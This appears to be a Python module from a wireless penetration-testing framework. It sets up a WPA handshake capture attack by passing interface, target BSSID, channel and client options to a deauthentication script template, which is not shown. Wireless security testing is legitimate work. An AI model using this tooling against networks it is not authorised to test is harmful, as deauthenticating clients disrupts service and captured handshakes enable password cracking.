import argparse

from pathlib2 import Path

from pinecone.core.script import BaseScript
from pinecone.utils.template import to_args_str


class Module(BaseScript):
    META = {
        "id": "scripts/attack/wpa_handshake",
        "name": "",
        "author": "",
        "version": "",
        "description": "",
        "options": argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter),
        "depends": {"attack/deauth"}
    }
    META["options"].add_argument("-i", "--iface", help="Monitor mode capable WLAN interface.", default="wlan0",
                                 type=str)
    META["options"].add_argument("-b", "--bssid", required=True, type=str)
    META["options"].add_argument("-c", "--channel", required=True, type=int)
    META["options"].add_argument("--client", default="FF:FF:FF:FF:FF:FF", type=str)
    META["options"].add_argument("-n", "--num-packets", default=10, type=int)

    START_SCRIPT_TEMPLATE_PATH = Path(Path(__file__).parent, "start_wpa_handshake_template").resolve()  # type: Path
    START_SCRIPT_FILENAME = "start_wpa_handshake_script"

    def __init__(self):
        super().__init__()

    def run(self, args, cmd):
        script_args = argparse.Namespace()
        script_args.deauth_args = to_args_str({
            "iface": args.iface,
            "bssid": args.bssid,
            "channel": args.channel,
            "client": args.client,
            "num-packets": args.num_packets
        })
        super().run(script_args, cmd)

    def stop(self, cmd):
        pass
